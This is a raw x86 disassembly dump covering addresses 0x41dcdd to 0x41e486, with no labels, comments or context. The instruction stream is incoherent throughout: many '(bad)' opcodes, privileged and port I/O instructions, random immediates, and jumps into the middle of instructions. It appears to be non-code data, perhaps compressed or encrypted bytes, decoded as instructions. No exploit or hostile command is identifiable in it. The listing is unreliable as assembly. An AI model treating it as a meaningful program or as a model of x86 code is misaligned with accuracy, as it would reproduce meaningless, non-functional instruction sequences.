  41dcdd:	add    DWORD PTR [eax],eax
  41dcdf:	lods   eax,DWORD PTR ds:[esi]
  41dce0:	add    BYTE PTR [eax],al
  41dce2:	add    cl,dl
  41dce4:	(bad)  
  41dce5:	jl     0x41dc81
  41dce7:	idiv   DWORD PTR [bx+si+0x7b7c]
  41dcec:	cli    
  41dced:	int3   
  41dcee:	inc    esp
  41dcef:	sub    dl,BYTE PTR [eax-0x5dd5d650]
  41dcf5:	mov    ecx,0xe46aea1e
  41dcfa:	mov    edi,0xbc8b78ef
  41dcff:	dec    eax
  41dd00:	fcomip st,st(4)
  41dd02:	xchg   ecx,eax
  41dd03:	stos   BYTE PTR es:[edi],al
  41dd04:	pop    eax
  41dd05:	push   cs
  41dd06:	leave  
  41dd07:	xchg   ecx,eax
  41dd08:	cmp    eax,0xafc3c8c7
  41dd0d:	mov    ds:0xda047755,al
  41dd12:	dec    eax
  41dd13:	imul   eax,DWORD PTR [ebx-0x709cd3f1],0xde3b8c53
  41dd1d:	fidivr DWORD PTR [ebp-0x4cee12e]
  41dd23:	cmp    eax,0xaaf94d95
  41dd28:	shl    BYTE PTR [edx-0x6e9d836c],0xac
  41dd2f:	test   al,0xf3
  41dd31:	pop    eax
  41dd32:	hlt    
  41dd33:	sbb    eax,0xec613379
  41dd38:	cdq    
  41dd39:	cli    
  41dd3a:	push   edi
  41dd3b:	dec    esp
  41dd3c:	(bad)  
  41dd3d:	ss jmp 0x41dd22
  41dd40:	adc    edi,DWORD PTR [eax+0x1bf8e1a8]
  41dd46:	jmp    0x41dd03
  41dd48:	xchg   esi,eax
  41dd49:	ret    0x593b
  41dd4c:	add    ebx,DWORD PTR [eax]
  41dd4e:	test   DWORD PTR [esi+ebx*1+0x54ddf9a8],edx
  41dd55:	fwait
  41dd56:	mov    gs:0x2b528485,al
  41dd5c:	or     eax,0x9aaf1b03
  41dd61:	popf   
  41dd62:	jnp    0x41dd4a
  41dd64:	and    al,0xf7
  41dd66:	mov    bh,0x4
  41dd68:	dec    ebx
  41dd69:	dec    ecx
  41dd6a:	mov    WORD PTR [esp+ecx*4-0x2a],es
  41dd6e:	test   DWORD PTR [eax],esi
  41dd70:	std    
  41dd71:	fiadd  WORD PTR [ebx+0x20603921]
  41dd77:	icebp  
  41dd78:	inc    esi
  41dd79:	mov    ah,0x73
  41dd7b:	aas    
  41dd7c:	leave  
  41dd7d:	add    ecx,esp
  41dd7f:	mov    DWORD PTR [esi+0x3d],edi
  41dd82:	jb     0x41dd1c
  41dd84:	mov    ?,WORD PTR [ebp-0x65b05089]
  41dd8a:	call   0x724c8bbe
  41dd8f:	pop    ecx
	...
  41dd98:	add    BYTE PTR [eax],al
  41dd9a:	add    BYTE PTR [eax],bh
  41dd9c:	push   0xffffff96
  41dd9e:	add    edx,esi
  41dda0:	(bad)  
  41dda1:	mov    ebp,0xdb4ef67b
  41dda6:	out    0xac,eax
  41dda8:	das    
  41dda9:	jo     0x41dde9
  41ddab:	cld    
  41ddac:	fwait
  41ddad:	add    DWORD PTR [eax],eax
  41ddaf:	lods   eax,DWORD PTR ds:[esi]
  41ddb0:	add    BYTE PTR [eax],al
  41ddb2:	add    bl,ah
  41ddb4:	or     eax,0xf52bcb19
  41ddb9:	pop    ecx
  41ddba:	xor    al,0xb6
  41ddbc:	jge    0x41dd62
  41ddbe:	mov    esp,0xb844fb06
  41ddc3:	daa    
  41ddc4:	jne    0x41de0b
  41ddc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddc7:	sti    
  41ddc8:	ret    0xcb54
  41ddcb:	pop    ebx
  41ddcd:	aam    0x4
  41ddcf:	imul   esp,DWORD PTR [eax+edi*8-0x54a5080d],0x1b
  41ddd7:	div    dl
  41ddd9:	loopne 0x41de37
  41dddb:	retf   
  41dddc:	push   eax
  41dddd:	ficom  WORD PTR ds:0xb9a747a9
  41dde3:	into   
  41dde4:	cmp    eax,DWORD PTR [esi+0x5615d668]
  41ddea:	je     0x41de25
  41ddec:	or     DWORD PTR [edx-0x7],ebx
  41ddef:	sub    edx,DWORD PTR [ecx+0x1a]
  41ddf2:	xchg   ebx,eax
  41ddf3:	outs   dx,BYTE PTR ds:[esi]
  41ddf4:	jmp    0x41ddb0
  41ddf6:	popf   
  41ddf7:	int    0x5c
  41ddf9:	iret   
  41ddfa:	repz add BYTE PTR [ebx+ebx*2+0xb],dh
  41ddff:	cs test al,0xe4
  41de02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de03:	dec    ebx
  41de04:	bound  edi,QWORD PTR [eax]
  41de06:	pop    ecx
  41de07:	(bad)  
  41de08:	aad    0x9f
  41de0a:	mov    ch,0x18
  41de0c:	adc    edi,DWORD PTR [esi+0x5e101a67]
  41de12:	mov    ?,edx
  41de14:	ins    DWORD PTR es:[edi],dx
  41de15:	mov    eax,ds:0x4f5b12bf
  41de1a:	or     eax,0xaaae2df4
  41de1f:	in     eax,0x17
  41de21:	pop    ebp
  41de22:	test   al,0x1e
  41de24:	repz jg 0x41de39
  41de27:	sahf   
  41de28:	or     ecx,esp
  41de2a:	jmp    0x41de42
  41de2c:	stos   BYTE PTR es:[edi],al
  41de2d:	mov    ebp,0x11fb9f65
  41de32:	scas   al,BYTE PTR es:[edi]
  41de33:	aam    0x45
  41de35:	fmul   DWORD PTR [esi+0x16]
  41de38:	xchg   ebp,eax
  41de39:	push   ecx
  41de3a:	ds push ebx
  41de3c:	out    0xa1,eax
  41de3e:	loop   0x41de6b
  41de40:	sbb    eax,0x167fe70d
  41de45:	dec    ecx
  41de46:	push   ecx
  41de47:	(bad)  [eax-0x25]
  41de4a:	repnz or al,0xfa
  41de4d:	cmp    BYTE PTR [eax+0x2416f135],dh
  41de53:	gs jbe 0x41de42
  41de56:	or     esi,DWORD PTR ds:0x5caace11
  41de5c:	xchg   ebp,eax
  41de5d:	je     0x41de0b
  41de5f:	repnz add BYTE PTR [eax],al
	...
  41de6a:	add    cl,ch
  41de6c:	mov    ecx,0xf37a307a
  41de71:	jmp    0x41de6c
  41de73:	fimul  DWORD PTR [esp+eax*2+0x6c]
  41de77:	cmp    al,0x96
  41de79:	cmp    eax,0x19ca977
  41de7e:	add    BYTE PTR [ebp-0x47000000],ch
  41de84:	daa    
  41de85:	loope  0x41ded9
  41de87:	lea    edi,[ebx+0xebff2b2]
  41de8d:	inc    ebx
  41de8e:	pop    es
  41de8f:	sbb    BYTE PTR [ebx-0x4bb14e23],bh
  41de95:	nop
  41de96:	dec    ecx
  41de97:	stc    
  41de98:	mov    edx,0xc63bf40d
  41de9d:	pop    ecx
  41de9e:	ja     0x41df03
  41dea0:	xor    dl,ah
  41dea2:	test   eax,0x9b54de14
  41dea7:	fwait
  41dea8:	xor    esi,ebx
  41deaa:	xchg   DWORD PTR [ebx-0x72],eax
  41dead:	std    
  41deae:	fistp  QWORD PTR [edi-0x71]
  41deb1:	and    BYTE PTR [esi+0x7f],bh
  41deb4:	in     eax,0x8c
  41deb6:	add    bh,bl
  41deb8:	push   esi
  41deb9:	scas   al,BYTE PTR es:[edi]
  41deba:	and    DWORD PTR [esi+0x1cecb6aa],ebp
  41dec0:	loope  0x41de49
  41dec2:	arpl   WORD PTR [edi],bx
  41dec4:	mov    al,0xe
  41dec6:	xchg   edx,eax
  41dec7:	out    0x70,eax
  41dec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41deca:	jmp    0x41de65
  41decc:	or     eax,0xf27df13
  41ded1:	loop   0x41de92
  41ded3:	mov    cl,0x9c
  41ded5:	jo     0x41df14
  41ded7:	or     al,BYTE PTR [ecx]
  41ded9:	inc    esp
  41deda:	pop    edi
  41dedb:	mov    dh,0xfb
  41dedd:	mov    ebp,edi
  41dedf:	pushf  
  41dee0:	ins    DWORD PTR es:[edi],dx
  41dee1:	popa   
  41dee2:	lds    ecx,FWORD PTR [ebx-0x6b]
  41dee5:	lods   al,BYTE PTR ds:[esi]
  41dee6:	dec    ecx
  41dee7:	xlat   BYTE PTR ds:[ebx]
  41dee8:	xor    cl,BYTE PTR [eax-0x4796995a]
  41deee:	outs   dx,BYTE PTR ds:[esi]
  41deef:	lods   eax,DWORD PTR ds:[esi]
  41def0:	cmp    dl,0x6e
  41def3:	dec    edi
  41def4:	leave  
  41def5:	dec    ebx
  41def6:	pop    ebx
  41def7:	test   ecx,edi
  41def9:	mov    ch,0xd4
  41defb:	jo     0x41dee8
  41defd:	test   DWORD PTR [ecx+0x7d191084],ecx
  41df03:	fild   DWORD PTR [ebx-0x3e5d1124]
  41df09:	cwde   
  41df0a:	scas   al,BYTE PTR es:[edi]
  41df0b:	mov    DWORD PTR [ecx-0x51685351],0xecb5927d
  41df15:	std    
  41df16:	jmp    0x41dee2
  41df18:	gs push ebx
  41df1a:	mov    ch,0x32
  41df1c:	xor    eax,0x836c8080
  41df21:	adc    ch,BYTE PTR [edx-0x59bac609]
  41df27:	test   eax,0x3da6bfa8
  41df2c:	adc    al,0xf0
  41df2e:	pop    ecx
  41df2f:	ja     0x41df31
	...
  41df39:	add    BYTE PTR [eax],al
  41df3b:	pop    ebx
  41df3c:	inc    ecx
  41df3d:	pop    ebx
  41df3e:	iret   
  41df3f:	pop    ebx
  41df40:	(bad)  
  41df42:	aad    0xf
  41df44:	ss dec esp
  41df46:	dec    esi
  41df47:	fist   DWORD PTR [ebx-0x5a]
  41df4a:	xor    dl,BYTE PTR [esi-0x63]
  41df4d:	add    DWORD PTR [eax],eax
  41df4f:	lods   eax,DWORD PTR ds:[esi]
  41df50:	add    BYTE PTR [eax],al
  41df52:	add    dh,al
  41df54:	pop    edi
  41df55:	inc    esi
  41df56:	adc    bl,BYTE PTR [edx+0x68]
  41df59:	(bad)  
  41df5a:	dec    eax
  41df5b:	les    edx,FWORD PTR [edi-0x60]
  41df5e:	jno    0x41deea
  41df60:	cld    
  41df61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df62:	cmp    cl,BYTE PTR [ecx+esi*1-0x30]
  41df66:	pop    ss
  41df67:	ins    DWORD PTR es:[edi],dx
  41df68:	call   0xec74d3f8
  41df6d:	daa    
  41df6e:	int3   
  41df6f:	cmp    eax,0xaf58feb2
  41df74:	push   0x8e5a0ee2
  41df79:	dec    edx
  41df7a:	mov    BYTE PTR [esp+edi*8-0x5a],cl
  41df7e:	das    
  41df7f:	inc    edi
  41df80:	lea    esp,[ecx]
  41df82:	mov    ds:0x502384eb,eax
  41df87:	sti    
  41df88:	aad    0xb
  41df8a:	mov    al,0x7d
  41df8c:	mov    al,ds:0x9eea1854
  41df91:	in     eax,0x75
  41df93:	outs   dx,DWORD PTR ds:[esi]
  41df94:	mov    DWORD PTR [ebx+ecx*2],edi
  41df97:	mov    ecx,DWORD PTR [ebp+0x49e767eb]
  41df9d:	aam    0x5d
  41df9f:	add    DWORD PTR [esi],ebx
  41dfa1:	push   esi
  41dfa2:	int    0xbf
  41dfa4:	dec    esp
  41dfa5:	mov    edi,0xf104d932
  41dfaa:	fsubp  st(4),st
  41dfac:	jp     0x41dfb3
  41dfae:	sub    bl,BYTE PTR [ecx+ebx*4+0x1da4e0dd]
  41dfb5:	es call 0xc74d0727
  41dfbb:	jge    0x41df47
  41dfbd:	fidiv  WORD PTR [eax]
  41dfbf:	ror    BYTE PTR [ecx],0x6b
  41dfc2:	add    al,0xb7
  41dfc4:	jnp    0x41df7d
  41dfc6:	jmp    0x41df54
  41dfc8:	daa    
  41dfc9:	push   es
  41dfca:	ror    DWORD PTR [edx+0x59],1
  41dfcd:	sub    al,cl
  41dfcf:	or     BYTE PTR [ebx],cl
  41dfd1:	ja     0x41dfd9
  41dfd3:	jo     0x41df96
  41dfd5:	fstp   TBYTE PTR gs:[ecx-0x6c]
  41dfd9:	add    esp,ebp
  41dfdb:	sub    bl,BYTE PTR [eax-0x40]
  41dfde:	(bad)  
  41dfdf:	adc    eax,0x4cde6313
  41dfe4:	sbb    BYTE PTR [edi],dh
  41dfe6:	pop    esp
  41dfe7:	mov    al,BYTE PTR [ecx+0x74f16fb9]
  41dfed:	call   0xf3c6:0xef945e67
  41dff4:	popf   
  41dff5:	sub    cl,BYTE PTR [ecx]
  41dff7:	mov    edx,?
  41dff9:	xchg   BYTE PTR [ebx-0x39c2bcf3],dl
  41dfff:	(bad)  
	...
  41e008:	add    BYTE PTR [eax],al
  41e00a:	add    BYTE PTR [ebx+0x7f3c6585],bl
  41e010:	cld    
  41e011:	(bad)  [edi-0x65be08a1]
  41e017:	cmp    al,0xdb
  41e019:	add    eax,DWORD PTR cs:[ebx]
  41e01c:	sahf   
  41e01d:	add    DWORD PTR [eax],eax
  41e01f:	lods   eax,DWORD PTR ds:[esi]
  41e020:	add    BYTE PTR [eax],al
  41e022:	add    al,cl
  41e024:	mov    eax,0x5462e1f4
  41e029:	mov    ah,0x41
  41e02b:	push   ss
  41e02c:	adc    BYTE PTR [eax-0x39],0xfb
  41e030:	mov    bl,0x15
  41e032:	xor    edx,esp
  41e034:	xchg   ebp,eax
  41e035:	or     BYTE PTR [esp+edx*8-0x5af005b5],dl
  41e03c:	inc    esp
  41e03d:	mov    al,0x93
  41e03f:	xor    BYTE PTR [ebx],ch
  41e041:	mov    ds:0x707924e8,al
  41e046:	or     eax,0xb10b4a4d
  41e04b:	adc    eax,0x1bd3c6d9
  41e050:	xchg   ebx,eax
  41e051:	push   eax
  41e052:	aas    
  41e053:	jbe    0x41e024
  41e055:	and    ebp,esi
  41e057:	shl    BYTE PTR [esi],1
  41e059:	push   cs
  41e05a:	inc    esi
  41e05b:	fist   WORD PTR [esi-0x2889b2f8]
  41e061:	sub    ebx,edx
  41e063:	inc    ecx
  41e064:	fdivr  QWORD PTR [esi+eiz*8+0xf3d71b2]
  41e06b:	jl     0x41e056
  41e06d:	push   ss
  41e06e:	push   cs
  41e06f:	cmp    BYTE PTR [esp+edx*8-0x1f],dl
  41e073:	loopne 0x41e01b
  41e075:	and    ch,cl
  41e077:	mov    ecx,0xae94b277
  41e07c:	jl     0x41e0af
  41e07e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e07f:	mov    bh,0x19
  41e081:	pop    ebp
  41e082:	leave  
  41e083:	sub    al,0x3
  41e085:	enter  0xb377,0x84
  41e089:	inc    edi
  41e08a:	sub    DWORD PTR [edi],0xffffffde
  41e08d:	add    esi,DWORD PTR [edi-0x26]
  41e090:	dec    edx
  41e091:	arpl   WORD PTR [ebx+0x647e5d7b],di
  41e097:	loope  0x41e095
  41e099:	mov    bl,BYTE PTR [edi+0x2c248b84]
  41e09f:	sbb    eax,0x5db5ef2
  41e0a4:	cdq    
  41e0a5:	cmp    bl,bh
  41e0a7:	or     al,0xf7
  41e0a9:	mov    cl,BYTE PTR [ecx+edi*2]
  41e0ac:	push   0x69
  41e0ae:	js     0x41e0d5
  41e0b0:	push   es
  41e0b1:	push   ecx
  41e0b2:	mov    DWORD PTR [ecx-0x28],eax
  41e0b5:	mov    esi,0x1851cff1
  41e0ba:	ds inc ecx
  41e0bc:	es mov edx,0xbf53c91b
  41e0c2:	cmp    esp,DWORD PTR [esi+0x7f036dfe]
  41e0c8:	rol    BYTE PTR [ebp+0x79],1
  41e0cb:	pusha  
  41e0cc:	or     eax,DWORD PTR [esi+0xf16d]
	...
  41e0da:	add    BYTE PTR [esi+0x73],ch
  41e0dd:	lock retf 0xcbfd
  41e0e1:	jle    0x41e0da
  41e0e3:	repz xor eax,0x3848ce9
  41e0e9:	in     al,dx
  41e0ea:	mov    esp,0x19eb0
  41e0ef:	lods   eax,DWORD PTR ds:[esi]
  41e0f0:	add    BYTE PTR [eax],al
  41e0f2:	add    cl,bl
  41e0f4:	sbb    esi,DWORD PTR [ebp-0xa459f62]
  41e0fa:	adc    eax,0x2af3ea76
  41e0ff:	(bad)  
  41e101:	ret    0x7fee
  41e104:	ffreep st(2)
  41e106:	pushf  
  41e107:	xlat   BYTE PTR ds:[ebx]
  41e108:	pusha  
  41e109:	add    BYTE PTR ds:0x760c1074,ch
  41e10f:	push   ecx
  41e110:	jnp    0x41e092
  41e112:	pop    ebx
  41e113:	shr    bl,0xc3
  41e116:	sub    al,ch
  41e118:	leave  
  41e119:	mov    dl,0x79
  41e11b:	mov    eax,ds:0xb8aa403a
  41e120:	xor    esi,DWORD PTR [edi+ebp*4]
  41e123:	sbb    al,0x6e
  41e125:	stos   DWORD PTR es:[edi],eax
  41e126:	fcom   QWORD PTR [ebx]
  41e128:	arpl   WORD PTR [edx],dx
  41e12a:	xor    dh,bh
  41e12c:	fst    QWORD PTR [ebx+0x76814123]
  41e132:	jo     0x41e19d
  41e134:	push   ebp
  41e135:	xchg   ebx,eax
  41e136:	mov    ebx,DWORD PTR [eax]
  41e138:	out    dx,al
  41e139:	out    dx,al
  41e13a:	dec    edi
  41e13b:	cmp    eax,0x8f65a34a
  41e140:	push   ebp
  41e141:	leave  
  41e142:	ins    DWORD PTR es:[edi],dx
  41e143:	jg     0x41e159
  41e145:	rcr    BYTE PTR [ecx],cl
  41e147:	and    al,0x59
  41e149:	dec    edx
  41e14a:	xchg   edx,eax
  41e14b:	push   ss
  41e14c:	sub    ebp,edi
  41e14e:	jl     0x41e19e
  41e150:	test   BYTE PTR [ebx+0x1c],0x61
  41e154:	mov    bl,0x9d
  41e156:	mov    bl,0x3e
  41e158:	ret    0x1f06
  41e15b:	lods   al,BYTE PTR ds:[esi]
  41e15c:	push   0xffffffa7
  41e15e:	jl     0x41e1b7
  41e160:	inc    ecx
  41e161:	jge    0x41e0f1
  41e163:	leave  
  41e164:	mov    edx,0x1d117ee5
  41e169:	xor    ch,BYTE PTR [ebp-0x32]
  41e16c:	ja     0x41e131
  41e16e:	(bad)  
  41e16f:	jmp    0xfe61:0x7414470b
  41e176:	(bad)
  41e17a:	mov    dh,0x59
  41e17c:	cmp    DWORD PTR ds:0xf1b7a877,ebp
  41e182:	and    DWORD PTR [edi],edi
  41e184:	push   ss
  41e185:	xor    ebp,DWORD PTR [edi]
  41e187:	or     edx,DWORD PTR [edx]
  41e189:	push   esp
  41e18a:	jnp    0x41e1e3
  41e18c:	(bad)  [ebp+0x22]
  41e18f:	mov    ebp,0x8ef0f4a5
  41e194:	mov    ebx,0xfce07e6a
  41e199:	test   DWORD PTR fs:[ebx-0x2a],esi
  41e19d:	stos   BYTE PTR es:[edi],al
  41e19e:	jb     0x41e1c1
	...
  41e1a8:	add    BYTE PTR [eax],al
  41e1aa:	add    ch,dh
  41e1ac:	adc    al,0xae
  41e1ae:	adc    ebp,edi
  41e1b0:	mov    ebx,0x84e6f6fd
  41e1b5:	lds    ebp,FWORD PTR [edx+0x6346e40e]
  41e1bb:	pop    ebp
  41e1bc:	lahf   
  41e1bd:	add    DWORD PTR [eax],eax
  41e1bf:	lods   eax,DWORD PTR ds:[esi]
  41e1c0:	add    BYTE PTR [eax],al
  41e1c2:	add    BYTE PTR ds:0x406a29bb,dh
  41e1c8:	add    ebx,edi
  41e1ca:	enter  0x14ed,0xdf
  41e1ce:	popa   
  41e1cf:	gs xchg ebx,eax
  41e1d1:	leave  
  41e1d2:	and    eax,0x738c52c7
  41e1d7:	mov    bh,0x8b
  41e1d9:	adc    DWORD PTR [edi+0x1fc309ab],eax
  41e1df:	cmc    
  41e1e0:	dec    ebp
  41e1e1:	push   esi
  41e1e2:	mov    ds:0x2db628d7,al
  41e1e7:	dec    ebp
  41e1e8:	inc    esi
  41e1e9:	ret    0x2d96
  41e1ec:	pop    ecx
  41e1ed:	add    al,BYTE PTR ds:0xf9d0fde4
  41e1f3:	mov    ebp,0x63ce4461
  41e1f8:	pop    edi
  41e1f9:	ror    DWORD PTR [esi],0xb2
  41e1fc:	cmc    
  41e1fd:	shl    DWORD PTR [ebx+0x72],cl
  41e200:	or     al,0xd3
  41e202:	cmp    eax,0x812dd14a
  41e207:	xor    ecx,DWORD PTR [edx+0x76]
  41e20a:	mov    edx,0xe8f55fdb
  41e20f:	mov    ds:0x812e439b,al
  41e214:	pop    esi
  41e215:	sbb    ah,al
  41e217:	ret    0x69d5
  41e21a:	sub    al,0x7a
  41e21c:	mov    cl,0x82
  41e21e:	push   ss
  41e21f:	pop    edi
  41e220:	pop    esi
  41e221:	dec    edx
  41e222:	xchg   ecx,eax
  41e223:	cld    
  41e224:	mov    ebx,0x4e87480e
  41e229:	adc    eax,0xac5a5302
  41e22e:	xchg   DWORD PTR [esi-0x40be785b],edi
  41e234:	mov    dh,bl
  41e236:	stc    
  41e237:	inc    edi
  41e238:	js     0x41e2a4
  41e23a:	jnp    0x41e299
  41e23c:	and    eax,0xcf40ed0b
  41e241:	ja     0x41e1d2
  41e243:	lods   al,BYTE PTR ds:[esi]
  41e244:	out    0x13,eax
  41e246:	push   edi
  41e247:	(bad)  
  41e248:	xchg   ebp,eax
  41e249:	in     eax,dx
  41e24a:	loope  0x41e2bf
  41e24c:	sub    DWORD PTR [esi+0xc],esi
  41e24f:	lea    eax,[esi]
  41e251:	cmp    DWORD PTR ss:[ebx-0x34831503],eax
  41e258:	fwait
  41e259:	sbb    eax,ebx
  41e25b:	mov    DWORD PTR [eax-0x6a42f158],esp
  41e261:	cmp    al,0x7b
  41e263:	mov    esp,fs
  41e265:	xor    eax,0xd381ba06
  41e26a:	cmp    ebp,0xa7f096e4
	...
  41e278:	add    BYTE PTR [eax],al
  41e27a:	add    BYTE PTR [ebx],bh
  41e27c:	mov    cl,0x57
  41e27e:	lock fcomip st,st(6)
  41e281:	mov    edi,0xbb1c16fb
  41e286:	rcr    BYTE PTR [ebx+ecx*8],0x90
  41e28a:	test   eax,0x1a00a
  41e28f:	lods   eax,DWORD PTR ds:[esi]
  41e290:	add    BYTE PTR [eax],al
  41e292:	add    BYTE PTR [eax-0x55],dl
  41e295:	pop    ebx
  41e296:	and    BYTE PTR [ebp-0x4bbc4468],ch
  41e29c:	jmp    0x41e318
  41e29e:	dec    edx
  41e29f:	sbb    bh,BYTE PTR [esi]
  41e2a1:	lods   eax,DWORD PTR ds:[esi]
  41e2a2:	push   ss
  41e2a3:	mov    esi,0x9e4ae5af
  41e2a8:	mov    al,BYTE PTR [edi]
  41e2aa:	dec    esp
  41e2ab:	shl    BYTE PTR [ebp+0x5c7c6436],cl
  41e2b1:	cmc    
  41e2b2:	push   edx
  41e2b3:	nop
  41e2b4:	rcr    DWORD PTR [eax+0x73],0xd2
  41e2b8:	shr    BYTE PTR [esp-0x19],0x11
  41e2bd:	xchg   edi,eax
  41e2be:	sbb    al,0xa5
  41e2c0:	je     0x41e2ed
  41e2c2:	scas   eax,DWORD PTR es:[edi]
  41e2c3:	jg     0x41e289
  41e2c5:	add    ah,al
  41e2c7:	dec    eax
  41e2c8:	pop    esi
  41e2c9:	(bad)  
  41e2ca:	enter  0x1303,0xc1
  41e2ce:	fdiv   st,st(2)
  41e2d0:	out    0x66,al
  41e2d2:	aam    0x49
  41e2d4:	or     DWORD PTR [edi],ecx
  41e2d6:	nop
  41e2d7:	jns    0x41e26e
  41e2d9:	in     al,0x2
  41e2db:	leave  
  41e2dc:	push   ebx
  41e2dd:	retf   0xb978
  41e2e0:	imul   ecx,DWORD PTR ds:0x125336e7,0x57
  41e2e7:	data16 mov ds:0x9a0ad2b4,al
  41e2ed:	pop    ebx
  41e2ee:	xchg   ebp,eax
  41e2ef:	(bad)  
  41e2f0:	push   0x8c9fc086
  41e2f5:	ss ins BYTE PTR es:[edi],dx
  41e2f7:	mov    ds:0xb6c096fc,eax
  41e2fc:	fidivr DWORD PTR [esi+0x44]
  41e2ff:	sbb    DWORD PTR [ebp-0x3a],0x206560d4
  41e306:	cmc    
  41e307:	cmp    edi,DWORD PTR [ebx+0x7e0cb994]
  41e30d:	dec    esi
  41e30e:	test   bl,bl
  41e310:	(bad)  
  41e312:	push   eax
  41e313:	cwde   
  41e314:	mov    cs,WORD PTR [ebx]
  41e316:	and    BYTE PTR [esi-0x39f66e4c],bl
  41e31c:	lea    eax,[edx+0x39e4017b]
  41e322:	fiadd  WORD PTR [edx]
  41e324:	scas   al,BYTE PTR es:[edi]
  41e325:	inc    eax
  41e326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e327:	pop    edx
  41e328:	retf   
  41e329:	adc    bl,bl
  41e32b:	push   ecx
  41e32c:	push   ds
  41e32d:	repnz pop esp
  41e32f:	cwde   
  41e330:	mov    ebx,0x9f3fbf59
  41e335:	je     0x41e336
  41e337:	mov    ds:0xfff424f3,al
  41e33c:	or     DWORD PTR [ebx],ecx
  41e33e:	neg    DWORD PTR [ebp+0x0]
	...
  41e349:	add    BYTE PTR [eax],al
  41e34b:	aam    0xf
  41e34d:	push   ecx
  41e34e:	lock (bad) 
  41e351:	cmc    
  41e352:	das    
  41e353:	sbb    BYTE PTR [eax],cl
  41e355:	xchg   ebx,eax
  41e356:	iret   
  41e357:	lods   al,BYTE PTR ds:[esi]
  41e358:	std    
  41e359:	and    bh,ch
  41e35b:	mov    bh,0xa0
  41e35d:	add    DWORD PTR [eax],eax
  41e35f:	lods   eax,DWORD PTR ds:[esi]
  41e360:	add    BYTE PTR [eax],al
  41e362:	add    BYTE PTR [esi-0x1e],bl
  41e365:	imul   edi,ebx,0x25
  41e368:	xor    DWORD PTR [eax+ebx*1],ebp
  41e36b:	inc    esp
  41e36c:	inc    ebp
  41e36d:	into   
  41e36e:	jo     0x8d568e16
  41e374:	cli    
  41e375:	inc    ebx
  41e376:	inc    ecx
  41e377:	fnsave [edi]
  41e379:	and    BYTE PTR [esi],ch
  41e37b:	mov    edi,0x2c82e87c
  41e380:	push   eax
  41e381:	(bad)  [ebx]
  41e383:	jno    0x41e3b0
  41e385:	pusha  
  41e386:	jno    0x41e3fb
  41e388:	xchg   ebx,eax
  41e389:	bound  eax,QWORD PTR [edx]
  41e38b:	in     eax,dx
  41e38c:	mov    bh,0x26
  41e38e:	push   ebx
  41e38f:	or     DWORD PTR [eax+0x430fc5fa],eax
  41e395:	fistp  WORD PTR [ebx]
  41e397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e398:	and    BYTE PTR [ebx-0x13cd1554],bl
  41e39e:	fcomp  QWORD PTR cs:[ecx+0x432d41ce]
  41e3a5:	add    al,0xeb
  41e3a7:	les    esp,FWORD PTR [edx+0x2a]
  41e3aa:	in     eax,dx
  41e3ab:	and    eax,0x9dce8921
  41e3b1:	adc    al,0x1a
  41e3b3:	in     al,dx
  41e3b4:	(bad)  
  41e3b5:	xchg   esp,eax
  41e3b6:	adc    DWORD PTR [edx-0x31],ebx
  41e3b9:	int    0x77
  41e3bb:	cmp    dh,BYTE PTR [edi-0x65]
  41e3be:	fist   DWORD PTR [ebx]
  41e3c0:	mov    dl,0x77
  41e3c2:	fcom   QWORD PTR [esi+0x6ee4cecb]
  41e3c8:	in     al,dx
  41e3c9:	push   cs
  41e3ca:	sub    ecx,DWORD PTR [ebp+0x2cd0e8fd]
  41e3d0:	pop    es
  41e3d1:	xchg   ebx,eax
  41e3d2:	pop    es
  41e3d3:	jo     0x41e42f
  41e3d5:	ss dec edx
  41e3d7:	jp     0x41e43d
  41e3d9:	or     eax,0xabf02cbb
  41e3de:	in     al,0x88
  41e3e0:	or     bl,BYTE PTR [eax]
  41e3e2:	inc    esp
  41e3e3:	mov    ah,0x4d
  41e3e5:	imul   ecx,DWORD PTR [esi],0xffffffc7
  41e3e8:	inc    ebx
  41e3e9:	dec    eax
  41e3ea:	jb     0x41e45e
  41e3ec:	pusha  
  41e3ed:	sbb    BYTE PTR [eax+0x2df19d66],0xe2
  41e3f4:	retf   
  41e3f5:	and    BYTE PTR [ecx+0x4408cd5e],bl
  41e3fb:	sti    
  41e3fc:	fs sub eax,0xd5cbf9e5
  41e402:	scas   al,BYTE PTR es:[edi]
  41e403:	outs   dx,DWORD PTR ds:[esi]
  41e404:	inc    ecx
  41e405:	mov    edi,0xb742ab28
  41e40a:	mov    esi,0x5df6d2d6
  41e40f:	loop   0x41e411
	...
  41e419:	add    BYTE PTR [eax],al
  41e41b:	int    0x2d
  41e41d:	xchg   ebp,eax
  41e41e:	inc    ebx
  41e41f:	cmc    
  41e420:	sti    
  41e421:	fild   QWORD PTR [edi-0x5bdf5fa9]
  41e427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e428:	pop    es
  41e429:	ins    DWORD PTR es:[edi],dx
  41e42a:	stos   BYTE PTR es:[edi],al
  41e42b:	mov    eax,fs:0xad0001
  41e431:	add    BYTE PTR [eax],al
  41e433:	call   DWORD PTR [edi]
  41e435:	icebp  
  41e436:	xor    eax,0xa2a8242c
  41e43b:	loop   0x41e3f4
  41e43d:	aaa    
  41e43e:	imul   ecx,DWORD PTR [esi*2+0xcf2bf46],0x40
  41e446:	sub    dh,BYTE PTR [ebp-0x6e]
  41e449:	inc    ecx
  41e44a:	idiv   eax
  41e44c:	pop    ds
  41e44d:	ds pop esi
  41e44f:	mov    al,cs:0x498a1d3a
  41e455:	imul   eax,DWORD PTR [ebx-0x4367c7f2],0x2ba6ebd6
  41e45f:	mov    DWORD PTR [eax-0x7974df61],esi
  41e465:	(bad)  
  41e466:	and    eax,0x9a892545
  41e46b:	stos   DWORD PTR es:[edi],eax
  41e46c:	jmp    0xc5bb3699
  41e471:	ret    
  41e472:	stos   DWORD PTR es:[edi],eax
  41e473:	mov    al,0xae
  41e475:	mov    ebx,0x28026135
  41e47a:	push   edx
  41e47b:	jb     0x41e4bf
  41e47d:	scas   eax,DWORD PTR es:[edi]
  41e47e:	stos   DWORD PTR es:[edi],eax
  41e47f:	cli    
  41e480:	dec    esp
  41e481:	xchg   esp,eax
  41e482:	arpl   WORD PTR [esi-0x50],bx
  41e485:	pop    ecx
  41e486:	and    DWORD PTR [ebx],eax
